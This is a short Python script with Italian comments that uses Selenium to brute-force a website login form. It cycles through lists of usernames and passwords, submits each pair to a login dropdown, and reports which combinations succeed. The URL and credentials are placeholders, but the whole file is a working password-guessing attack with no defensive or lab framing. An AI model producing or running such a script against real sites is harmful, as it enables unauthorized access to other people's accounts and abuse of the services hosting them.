import time
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

# Liste di username e password
usernames = ["user1", "user2", "user3"]
passwords = ["password1", "password2", "password3"]

# Inizializza il driver di Selenium
driver = webdriver.Chrome()

# Apri il browser e vai all'URL
driver.get("https://www.example.com/")

for username in usernames:
    for password in passwords:
        try:
            # Trova l'elemento che attiva il dropdown
            dropdown_element = driver.find_element(By.CSS_SELECTOR, "div.relative.f_right.m_right_10.m_left_10.dropdown_2_container.login")

            # Posiziona il cursore sull'elemento
            actions = ActionChains(driver)
            actions.move_to_element(dropdown_element).perform()

            # Compila il form con i dati desiderati
            email_field = driver.find_element(By.NAME, "email_address")
            password_field = driver.find_element(By.NAME, "password")

            email_field.clear()
            email_field.send_keys(username)
            password_field.clear()
            password_field.send_keys(password)

            # Invia la richiesta POST al server
            submit_button = driver.find_element(By.ID, "button")
            submit_button.click()

            # Aggiungi un ritardo per consentire al server di elaborare la richiesta
            time.sleep(2)

            # Cerca nuovamente gli elementi email e password
            email_field = driver.find_element(By.NAME, "email_address")
            password_field = driver.find_element(By.NAME, "password")

            print("Accesso fallito - username:", username, "password:", password)

        except NoSuchElementException:
            print("Accesso riuscito - username:", username, "password:", password)
            break

driver.quit()
